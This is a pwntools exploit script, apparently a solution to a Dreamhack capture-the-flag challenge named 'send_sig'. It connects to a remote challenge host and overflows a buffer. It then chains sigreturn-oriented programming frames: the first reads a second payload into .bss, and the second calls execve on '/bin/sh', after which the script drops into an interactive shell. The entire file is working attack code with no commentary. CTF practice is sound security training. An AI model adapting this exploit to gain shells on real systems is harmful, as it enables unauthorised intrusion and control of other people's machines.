from pwn import *
p = remote('host3.dreamhack.games', 15725)
e = ELF('./send_sig')
context.arch = 'amd64'

pop_rax_ret = 0x4010ae
syscall = 0x4010b0
bss = e.bss() + 0x500

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rip = syscall
frame.rsp = bss

payload = b'A' *  16
payload += p64(pop_rax_ret)
payload += p64(15)  # syscall number for sigreturn
payload += p64(syscall)
payload += bytes(frame)
p.send(payload)

binsh = bss + 0x200
frame2 = SigreturnFrame()
frame2.rax = 59
frame2.rdi = binsh
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall

payload2 = b''
payload2 += p64(pop_rax_ret)
payload2 += p64(15)  # syscall number for sigreturn
payload2 += p64(syscall)
payload2 += bytes(frame2)
payload2 = payload2.ljust(0x200, b'\x00')
payload2 += b'/bin/sh\x00'

p.send(payload2)
p.interactive()